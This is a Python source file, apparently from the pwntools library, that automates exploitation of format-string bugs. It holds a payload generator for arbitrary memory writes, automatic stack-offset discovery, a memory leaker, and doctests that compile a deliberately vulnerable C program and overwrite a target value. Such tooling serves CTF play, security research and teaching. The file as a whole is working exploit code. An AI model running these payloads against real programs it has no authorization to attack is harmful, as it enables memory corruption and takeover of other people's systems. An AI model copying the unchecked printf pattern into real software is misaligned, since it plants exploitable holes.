r"""
Provide some tools to exploit format string bug

Examples:

    >>> program = tempfile.mktemp()
    >>> source  = program + ".c"
    >>> write(source, '''
    ... #include <stdio.h>
    ... #include <stdlib.h>
    ... #include <unistd.h>
    ... #include <sys/mman.h>
    ... #define MEMORY_ADDRESS ((void*)0x11111000)
    ... #define MEMORY_SIZE 1024
    ... #define TARGET ((int *) 0x11111110)
    ... int main(int argc, char const *argv[])
    ... {
    ...        char buff[1024];
    ...        void *ptr = NULL;
    ...        int *my_var = TARGET;
    ...        ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
    ...        if(ptr != MEMORY_ADDRESS)
    ...        {
    ...                perror("mmap");
    ...                return EXIT_FAILURE;
    ...        }
    ...        *my_var = 0x41414141;
    ...        write(1, &my_var, sizeof(int *));
    ...        scanf("%s", buff);
    ...        dprintf(2, buff);
    ...        write(1, my_var, sizeof(int));
    ...        return 0;
    ... }''')
    >>> cmdline = ["gcc", source, "-Wno-format-security", "-m32", "-o", program]
    >>> process(cmdline).wait_for_close()
    >>> def exec_fmt(payload):
    ...     p = process(program)
    ...     p.sendline(payload)
    ...     return p.recvall()
    ...
    >>> autofmt = FmtStr(exec_fmt)
    >>> offset = autofmt.offset
    >>> p = process(program, stderr=PIPE)
    >>> addr = unpack(p.recv(4))
    >>> payload = fmtstr_payload(offset, {addr: 0x1337babe})
    >>> p.sendline(payload)
    >>> print hex(unpack(p.recv(4)))
    0x1337babe

Example - Payload generation
^^^^^^^^^^^^^^^^^^^^^^^^^^^^

.. code-block:: python

    # we want to do 3 writes
    writes = {0x08041337:   0xbfffffff,
              0x08041337+4: 0x1337babe,
              0x08041337+8: 0xdeadbeef}

    # the printf() call already writes some bytes
    # for example :
    # strcat(dest, "blabla :", 256);
    # strcat(dest, your_input, 256);
    # printf(dest);
    # Here, numbwritten parameter must be 8
    payload = fmtstr_payload(5, writes, numbwritten=8)

Example - Automated exploitation
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

.. code-block:: python

	# Assume a process that reads a string
	# and gives this string as the first argument
	# of a printf() call
	# It do this indefinitely
	p = process('./vulnerable')

	# Function called in order to send a payload
	def send_payload(payload):
		log.info("payload = %s" % repr(payload))
		p.sendline(payload)
		return p.recv()

	# Create a FmtStr object and give to him the function
	format_string = FmtStr(execute_fmt=send_payload)
	format_string.write(0x0, 0x1337babe) # write 0x1337babe at 0x0
	format_string.write(0x1337babe, 0x0) # write 0x0 at 0x1337babe
	format_string.execute_writes()

"""
from __future__ import division

import logging
import re
from operator import itemgetter
from collections import namedtuple

from pwnlib.log import getLogger
from pwnlib.memleak import MemLeak
from pwnlib.util.cyclic import *
from pwnlib.util.fiddling import randoms
from pwnlib.util.packing import *

log = getLogger(__name__)

SPECIFIER = {
    1: 'hhn',
    2: 'hn',
    4: 'n',
    8: 'lln',
}

WRITE_SIZE = {
    "byte": 1,
    "short": 2,
    "int": 4,
}

def normalize_writes(writes):
    # make all writes flat
    writes = { address: flat(data) for address, data in writes.items() }

    # merge adjacent writes (and detect overlaps)
    merged = []
    prev_end = -1
    for address, data in sorted(writes.items(), key=itemgetter(0)):
        if address < prev_end:
            raise ValueError("normalize_fmtstr_writes(): data at offset %d overlaps with previous data which ends at offset %d" % (address, prev_end))

        if address == prev_end and merged:
            merged[-1] = (merged[-1][0], merged[-1][1] + data)
        else:
            merged.append((address, data))

        prev_end = address + len(data)

    return merged

# optimization examples (with bytes_written=0)
#
# 00 05 00 00     -> %n%5c%n
# 00 00 05 00 00  -> %n%5c%n
# 00 00 05 05 00 05  -> need overlapping writes if numbwritten > 5

Atom = namedtuple("FmtAtom", "address data")

def make_atoms_simple(address, data):
    return [Atom(address + i, d) for i, d in enumerate(data)]

def merge_atoms_size(atoms, maxsize=1):
    if maxsize <= 1:
        return atoms

    assert maxsize % 2 == 0, "write size must be power of two"
    atoms = merge_atoms_size(atoms, maxsize//2)
    merged = []
    for atom in atoms:
        if not merged:
            merged = [atom]
            continue

        prev = merged[-1]
        if len(prev.data) + len(atom.data) != maxsize:
            merged.append(atom)
        else:
            merged[-1] = Atom(prev.address, prev.data + atom.data)

    return merged

def make_payload_dollar(data_offset, atoms, numbwritten=0, countersize=4):
    data = ""
    fmt = ""

    counter = numbwritten
    for idx, atom in enumerate(atoms):
        sz = len(atom.data)

        # set format string counter to correct value
        val = unpack(atom.data, 'all')
        padding = (val - counter) % (1 << (sz * 8))
        if countersize == 32 and counter > 2147483600:
            warn("number of written bytes in format string close to 1 << 31. this will likely not work on glibc")
        counter = (counter + padding) % (1 << (countersize * 8))

        # perform write
        if padding:
            fmt += "%" + str(padding) + "c"
        fmt += "%" + str(data_offset + idx) + "$" + SPECIFIER[sz]
        data += pack(atom.address)

    return fmt, data

def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte'):
    r"""fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') -> str

    Makes payload with given parameter.
    It can generate payload for 32 or 64 bits architectures.
    The size of the addr is taken from ``context.bits``

    Arguments:
        offset(int): the first formatter's offset you control
        writes(dict): dict with addr, value ``{addr: value, addr2: value2}``
        numbwritten(int): number of byte already written by the printf function
        write_size(str): must be ``byte``, ``short`` or ``int``. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)
    Returns:
        The payload in order to do needed writes

    Examples:
        >>> context.clear(arch = 'amd64')
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int'))
        '%322419390c%5$n%3972547906c%6$na\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00'
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short'))
        '%47806c%7$hn%22649c%8$hn%60617c%9$hn%10$hnaaaaba\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00'
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte'))
        '%190c%12$hhn%252c%13$hhn%125c%14$hhn%220c%15$hhn%237c%16$hhn%17$hhn%18$hhn%19$hhnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00'
        >>> context.clear(arch = 'i386')
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int'))
        '%322419390c%5$na\x00\x00\x00\x00'
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short'))
        '%47806c%7$hn%22649c%8$hn\x00\x00\x00\x00\x02\x00\x00\x00'
        >>> print repr(fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte'))
        '%190c%13$hhn%252c%14$hhn%125c%15$hhn%220c%16$hhn\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00'

    """

    if write_size not in ['byte', 'short', 'int']:
        log.error("write_size must be 'byte', 'short' or 'int'")

    all_atoms = []
    for address, data in normalize_writes(writes):
        atoms = make_atoms_simple(address, data)
        atoms = merge_atoms_size(atoms, WRITE_SIZE[write_size])

        all_atoms += atoms

    fmt = ""
    for iteration in xrange(1000000):
        data_offset = len(fmt) // context.bytes
        fmt, data = make_payload_dollar(offset + data_offset, all_atoms)
        fmt = fmt + cyclic((-len(fmt)) % context.bytes)

        if len(fmt) == data_offset * context.bytes:
            break
    else:
        raise RuntimeError("this is a bug ... format string building did not converge")

    return fmt + data

class FmtStr(object):
    """
    Provides an automated format string exploitation.

    It takes a function which is called every time the automated
    process want to communicate with the vulnerable process. this
    function takes a parameter with the payload that you have to
    send to the vulnerable process and must return the process
    returns.

    If the `offset` parameter is not given, then try to find the right
    offset by leaking stack data.

    Arguments:
            execute_fmt(function): function to call for communicate with the vulnerable process
            offset(int): the first formatter's offset you control
            padlen(int): size of the pad you want to add before the payload
            numbwritten(int): number of already written bytes

    """

    def __init__(self, execute_fmt, offset = None, padlen = 0, numbwritten = 0):
        """
        Instantiates an object which try to automating exploit the vulnerable process

        Arguments:
            execute_fmt(function): function to call for communicate with the vulnerable process
            offset(int): the first formatter's offset you control
            padlen(int): size of the pad you want to add before the payload
            numbwritten(int): number of already written bytes
        """
        self.execute_fmt = execute_fmt
        self.offset = offset
        self.padlen = padlen
        self.numbwritten = numbwritten


        if self.offset == None:
            self.offset, self.padlen = self.find_offset()
            log.info("Found format string offset: %d", self.offset)

        self.writes = {}
        self.leaker = MemLeak(self._leaker)

    def leak_stack(self, offset, prefix=""):
        leak = self.execute_fmt(prefix+"START%{}$pEND".format(offset))
        try:
            leak = re.findall(r"START(.*)END", leak, re.MULTILINE | re.DOTALL)[0]
            leak = int(leak, 16)
        except ValueError:
            leak = 0
        return leak

    def find_offset(self):
        marker = cyclic(20)
        for off in range(1,1000):
            leak = self.leak_stack(off, marker)
            leak = pack(leak)

            pad = cyclic_find(leak)
            if pad >= 0 and pad < 20:
                return off, pad
        else:
            log.error("Could not find offset to format string on stack")
            return None, None

    def _leaker(self, addr):
        # Hack: elfheaders often start at offset 0 in a page,
        # but we often can't leak addresses containing null bytes,
        # and the page below elfheaders is often not mapped.
        # Thus the solution to this problem is to check if the next 3 bytes are
        # "ELF" and if so we lie and leak "\x7f"
        # unless it is leaked otherwise.
        if addr & 0xfff == 0 and self.leaker._leak(addr+1, 3, False) == "ELF":
            return "\x7f"

        fmtstr = randoms(self.padlen) + pack(addr) + "START%%%d$sEND" % self.offset

        leak = self.execute_fmt(fmtstr)
        leak = re.findall(r"START(.*)END", leak, re.MULTILINE | re.DOTALL)[0]

        leak += "\x00"

        return leak

    def execute_writes(self):
        """execute_writes() -> None

        Makes payload and send it to the vulnerable process

        Returns:
            None

        """
        fmtstr = randoms(self.padlen)
        fmtstr += fmtstr_payload(self.offset, self.writes, numbwritten=self.padlen, write_size='byte')
        self.execute_fmt(fmtstr)
        self.writes = {}

    def write(self, addr, data):
        r"""write(addr, data) -> None

        In order to tell : I want to write ``data`` at ``addr``.

        Arguments:
            addr(int): the address where you want to write
            data(int): the data that you want to write ``addr``

        Returns:
            None

        Examples:

            >>> def send_fmt_payload(payload):
            ...     print repr(payload)
            ...
            >>> f = FmtStr(send_fmt_payload, offset=5)
            >>> f.write(0x08040506, 0x1337babe)
            >>> f.execute_writes()
            '%190c%17$hhn%252c%18$hhn%125c%19$hhn%220c%20$hhn\x06\x05\x04\x08\x07\x05\x04\x08\x08\x05\x04\x08\t\x05\x04\x08'

        """
        self.writes[addr] = data
